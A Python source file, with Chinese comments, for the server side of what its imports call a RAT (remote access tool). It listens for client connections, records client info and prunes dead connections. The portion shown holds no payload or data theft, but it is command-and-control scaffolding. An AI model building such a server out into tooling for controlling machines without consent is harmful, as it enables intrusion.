import json
import socket

from common.ratsocket import RATSocket
from common.util import logger
from server.client import Client


class Server:

    def __init__(self, address):
        # 服务端地址
        self.address = address
        # 服务端套接字
        self.socket = RATSocket()
        # 已连接客户端列表
        self.connections = []

    def serve(self, func=None):
        """ 等待连接 """
        try:
            # 绑定
            self.socket.bind(self.address)
            logger.info('Listening on port {}'.format(self.address[1]))
            # 接受连接
            self.socket.accept(self.connection_handler, func)
        except socket.error as e:
            logger.error(e)

    def connection_handler(self, conn, addr, func=None):
        """ 保存连接 """
        # 设置5秒超时
        conn.settimeout(5)
        try:
            # 接收客户端信息
            info = json.loads(Client(conn).recv_result()[1])
        except json.JSONDecodeError:
            # 关闭连接
            conn.close()
            logger.error('Connection timed out: {}'.format(addr))
            return
        except Exception as e:
            logger.error('Error establishing connection: {}'.format(e))
            return
        # 取消超时
        conn.settimeout(None)
        info = {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}
        # 保存连接
        self.connections.append(Client(conn, addr, info))
        logger.info('Connection has been established: {}'.format(addr))
        if func:
            func(info)

    def test_connections(self):
        """ 移除无效连接 """
        for i, conn in reversed(list(enumerate(self.connections))):
            try:
                conn.send_command('null', 'null')
                conn.recv_result()
            except socket.error:
                del self.connections[i]
